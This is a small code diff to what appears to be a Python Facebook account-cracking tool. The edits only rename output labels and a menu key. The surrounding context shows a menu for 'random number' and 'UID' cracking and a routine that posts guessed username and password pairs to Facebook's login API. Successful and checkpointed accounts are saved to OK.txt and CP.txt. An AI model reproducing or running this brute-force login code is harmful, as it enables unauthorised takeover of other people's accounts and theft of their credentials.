@@ -79,7 +79,7 @@ def azimvau():
 	banner()
 	print(f' {H}[1]RANDOM NUMBER CRACK')
 	print(f' {K}[2]RANDOM UID CRACK')
-	print(f' {M}[B]BACK\n')
+	print(f' {M}[0]BACK\n')
 	opt = input(f'{B} CHOOSE : {H}')
 	if opt =='1':
 		random_number()
@@ -197,13 +197,13 @@ def cracker(user,pwx,tl):
 			xnxx = ses.post("https://b-api.facebook.com/method/auth.login", data=data, headers=head, allow_redirects=False).text
 			result = json.loads(xnxx)
 			if "session_key" in result:
-				print('\033[1;32m [AZIM-OK] '+user+'|'+pw+'\033[0;97m')
+				print('\033[1;32m [FIRE-OK] '+user+'|'+pw+'\033[0;97m')
 				open('OK.txt', 'a').write(user+'|'+pw+'\n')
 				oks.append(user)
 				break
 			elif "www.facebook.com" in result["error_msg"]:
 				print(result)
-				print('\033[1;31m [AZIM-CP] '+user+'|'+pw+'\033[0;97m')
+				print('\033[1;31m [FIRE-CP] '+user+'|'+pw+'\033[0;97m')
 				open('CP.txt', 'a').write(user+'|'+pw+'\n')
 				cps.append(user)
 				break
